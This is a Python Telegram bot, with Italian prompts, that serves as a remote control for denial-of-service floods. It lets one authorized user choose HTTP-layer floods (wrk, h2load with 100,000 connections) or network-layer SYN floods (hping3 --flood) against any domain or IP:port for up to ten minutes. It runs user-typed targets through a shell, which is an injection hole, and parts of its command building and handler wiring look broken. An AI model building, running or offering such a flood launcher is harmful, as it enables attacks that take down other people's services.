#!/usr/bin/env python3
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update
)
from telegram.ext import (
    Updater,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    Filters,
    CallbackContext
)
import subprocess
import os
import signal
import time
import threading

# ================= CONFIG =================
TOKEN = "INSERISCI_TOKEN"
AUTHORIZED_ID = 5699538596
MAX_DURATION = 600
# =========================================

process = None
running = False

# ===== PRESETS =====
L7_PRESETS = {
    "basic": {
        "label": "Basic",
        "bin": "wrk",
        "flags": "-t30 -c100000 -d10m"
    },
    "aggressive": {
        "label": "Aggressive",
        "bin": "h2load",
        "flags": "-n 10000 -c 100000 -t 30"
    }
}

L4_PRESETS = {
    "default": {
        "label": "Default",
        "cmd": "hping3",
        "args": "timeout 600 -S -p {port} -d 9999 --flood "
    },
    "fast": {
        "label": "Fast",
        "cmd": "tx_program",
        "args": "-p {port} -d 1400 -t 600"
    }
}

# ===== UI HELPERS =====
def progress_bar(p, size=18):
    filled = int(size * p)
    return "█" * filled + "░" * (size - filled)

def main_menu():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🟦 L7", callback_data="MODE:L7"),
            InlineKeyboardButton("🟥 L4", callback_data="MODE:L4")
        ],
        [
            InlineKeyboardButton("📡 Monitor", url="https://check-host.net")
        ]
    ])

def stop_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⛔ STOP", callback_data="STOP")]
    ])

# ---------- /start ----------
def start(update: Update, context: CallbackContext):
    if update.effective_user.id != AUTHORIZED_ID:
        return
    update.message.reply_text(
        "🚀 Seleziona modalità",
        reply_markup=main_menu()
    )

# ---------- MODE ----------
def choose_mode(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()

    mode = query.data.split(":")[1]
    context.user_data.clear()
    context.user_data["mode"] = mode

    presets = L7_PRESETS if mode == "L7" else L4_PRESETS

    kb = [
        [InlineKeyboardButton(p["label"], callback_data=f"PRESET:{k}")]
        for k, p in presets.items()
    ]

    query.edit_message_text(
        f"⚙️ {mode} • Seleziona preset",
        reply_markup=InlineKeyboardMarkup(kb)
    )

# ---------- PRESET ----------
def choose_preset(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()

    preset_key = query.data.split(":")[1]
    context.user_data["preset"] = preset_key

    query.edit_message_text(
        "🎯 Invia target\n\n"
        "• L7 → dominio / URL\n"
        "• L4 → IP:PORT"
    )

# ---------- TARGET ----------
def receive_target(update: Update, context: CallbackContext):
    if "preset" not in context.user_data:
        return

    context.user_data["target"] = update.message.text.strip()
    update.message.reply_text(f"⏱ Durata in secondi (max {MAX_DURATION})")

# ---------- DURATION ----------
def receive_duration(update: Update, context: CallbackContext):
    global process, running

    if running or "target" not in context.user_data:
        return

    try:
        duration = int(update.message.text.strip())
        if duration < 1 or duration > MAX_DURATION:
            return
    except ValueError:
        return

    mode = context.user_data["mode"]
    preset_key = context.user_data["preset"]
    target = context.user_data["target"]

    if mode == "L7":
        p = L7_PRESETS[preset_key]
        cmd = f"{p['bin']} {p['flags']} {target}"
        label = p["label"]
    else:
        if ":" not in target:
            return
        ip, port = target.split(":", 1)
        p = L4_PRESETS[preset_key]
        cmd = f"{p['cmd']} {p['args'].format(port=port)} {ip}"
        label = p["label"]

    process = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid
    )

    running = True

    msg = update.message.reply_text(
        "⏳ Avvio…",
        reply_markup=stop_menu()
    )

    threading.Thread(
        target=animate,
        args=(context, msg.chat_id, msg.message_id, duration, label),
        daemon=True
    ).start()

# ---------- ANIMATION ----------
def animate(context, chat_id, msg_id, duration, label):
    global running, process

    for elapsed in range(duration):
        if not running:
            break

        progress = (elapsed + 1) / duration
        percent = int(progress * 100)

        text = (
            f"🚀 {label}\n\n"
            f"⏳ [{progress_bar(progress)}] {percent}%\n"
            f"⏱ {duration - elapsed}s"
        )

        context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg_id,
            text=text,
            reply_markup=stop_menu()
        )

        time.sleep(1)

    running = False
    process = None

    context.bot.edit_message_text(
        chat_id=chat_id,
        message_id=msg_id,
        text="✅ Completato",
        reply_markup=main_menu()
    )

# ---------- STOP ----------
def stop(update: Update, context: CallbackContext):
    global running, process
    query = update.callback_query
    query.answer()

    if process:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)

    running = False
    process = None

    query.edit_message_text(
        "⛔ Fermato",
        reply_markup=main_menu()
    )

# ---------- MAIN ----------
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(choose_mode, pattern="^MODE:"))
    dp.add_handler(CallbackQueryHandler(choose_preset, pattern="^PRESET:"))
    dp.add_handler(CallbackQueryHandler(stop, pattern="^STOP$"))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, receive_target))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, receive_duration))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
